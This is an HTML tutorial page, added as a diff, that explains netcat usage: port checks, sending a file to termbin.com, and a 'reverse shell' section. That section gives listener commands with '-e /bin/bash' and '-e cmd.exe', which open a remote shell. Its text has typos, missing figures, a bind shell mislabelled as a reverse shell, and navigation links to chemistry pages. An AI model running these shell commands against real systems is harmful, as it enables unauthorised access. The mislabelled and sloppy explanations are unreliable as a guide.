@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta name="description" content="Netcat">
+	<title>Netcat</title>
+	<link rel="stylesheet" type="text/css" href="../../style.css" media="screen">
+</head>
+
+<body>
+
+<nav>
+	<ul>
+		<li><a class="navbar" href="../../index.html">Home</a></li>
+		<li><a class="navbar" href="index.html">Index</a></li>
+	</ul>
+</nav>
+
+<div class="content">
+
+<h1>Netcat</h1>
+
+<p>The <code>nc</code> command is short for netcat, a service that reads and writes over network connections. It's versatile. It can act like a telnet command to check for access over an available port, or it can act like an nmap command to scan a range of ports. Netcat can function in either a client or server mode. When it is in client mode, the tool can be used to make a network connection to another service (including another instance of Netcat). It is important to remember that Netcat can connect from any port on your local machine to any port on the target machine. While Netcat is running in server mode, it acts as a listener where it waits to accept an incoming connection. <br> First to demostrate one simple capability, run the <code>nc</code> command on a target port on a supposedly secure Apacha-based website on HTTPS port 443:</p>
+
+<pre>nc -v 192.168.0.1 443</pre>
+
+<p>When the following message appears, type <code>GET / HTTTP</code> at the next line:</p>
+
+<pre>Connection to 192.168.0.1 443 port [tcp/https] succeeded!</pre>
+
+<p>You can use <i>netcat</i> to send the contents of a file to <i>termbin.com</i> and receive a private link where you can download your text. For example, let's send a file called <i>good.txt</i> to Termbin using the following commnad</p>
+
+<pre>cat good.txt | nc termbin.com 9999</pre>
+
+<p>Netcat is a general-purpose utility tool that among other things, allows probing of network connections. It can be used to scan and read ports, move files between connections, and serve as a basic backdoor [67]. Netcat is an example of a powerful tool that works in many operating systems including versions of Linux and Microsoft windows. It can be used to do the following:</p>
+
+<ul>
+	<li><p>Create a server that responds to requests on a port;</p></li>
+	<li><p>Create a client that reaches out to connect to a server running on a port;</p></li>
+	<li><p>Grab banners from a web server to gain data about it;</p></li>
+	<li><p>Scan a range of ports;</p></li>
+	<li><p>Many others tasks.</p></li>
+</ul>
+
+<p>An example invocation is shown below in Figure 11.12, which demonstrates the netcat command in Kali Linux (nc) and directs the device to listen on a port. In this case below, port 1906 was chosen at random. The help manual for the netcat command provides the following instruction for use either as a client (e.g., connect to something) or a server (e.g., listen and respond to inbound connection requests). The format for the command (nc) is shown in Table 11.2 along with options. <br> Example uses of netcat are shown below in Table 11.3 to (a) connect to a host and (b) listen on a port, and (c) listen on a port and run a program on connection.</p>
+
+<h2>Creating a Reverse Shell</h2>
+
+<p>Netcat can be used to create what is called a reverse shell. This is when an attacker creates a way to connect to a target machine. 11 The steps to do this using netcat are to:</p>
+
+<ul>
+	<li><p>Run netcat on the targeted system and instruct it to listen on a port;</p></li>
+	<li><p>Issue a netcat command from the attacker machine to connect to the targeted machine.</p></li>
+</ul>
+
+<p>Figures 11.13 and 11.14 (and Table 11.3) show steps 1 and 2, where the attacker is a Kali Linux client (running on a virtual machine) and a target, which is a windows device. The result shown in the figure is the Kali Linux machine executing a windows directory command. This is a clear indicator that the attacker can issue commands on the targeted system.</p>
+
+<p>To set Netcat on the target/victim machine, we simply need to choose a port and instruct Netcat to run in listener mode. Assuming your target is a Linux machine, issuing the following command in a terminal will accomplish this task:</p>
+
+<pre>nc -l -p 1337</pre>
+
+<p>where <code>-l</code> is used to put Netcat into a listener mode. The <code>-p</code> is used to specify the port number we want Netcat to listen on. Now that we have Netcat listening on the target machine, we can move to the attacker machine. To make a connection to the listening mahcine, we issue the following command</p>
+
+<pre>nc 192.168.18.132 1337</pre>
+
+<p>Running this command from the 2nd PC will force Netcat to attempt a connection to port 1337 on the machine with a IP address of 192.168.18.132. Because we've set up the first PC to act as a listener on that port, the two PCs should now be able to communicate. We can test this by typing text into either terminal window. Anything that we type into the terminal from either machine weill be displayed in the terminal windod of both machines. To end the "chat" and close the ssion, we can issue the Ctrl- C key combination; this will terminate the Netcat connection.</p>
+
+<table>
+
+<caption>Three Example Uses of netcat</caption>
+
+<tr><th>No.</th> <th>Command Prompt</th> <th>Description</th></tr>
+
+<tr><th>1</th> <td>root@kali: ~# nc -v -l -p 1906</td> <td>Instructs OS on device to listen on port 1906</td></tr>
+
+<tr><th>2</th> <td>root@kali: ~# nc 198.71.232.3 80<br>root@kali: ~# nc -v -l -p 1906 -e /bin/bash <br> C:\> nc -v -l -p 1906 -e cmd.exe</td>  <td>Test everything works: Instructs OS to connect to IP address 198.71.232.3 (www.cyberwar101.com) listen on port 80 <br> Instructs OS to listen on port 1906 and upon connection open a shell (in Linux) or command line (in Windows); the -e option instructs to run a program upon connection.</td></tr>
+
+</table>
+
+<section aria-label="End">
+<a href="epoxides.html">&#171;Epoxides</a>
+<a href="index.html">Index</a>
+<a href="sulfides.html">Sulfides&#187;</a>
+</section>
+
+</div>
+
+</body>
+</html>
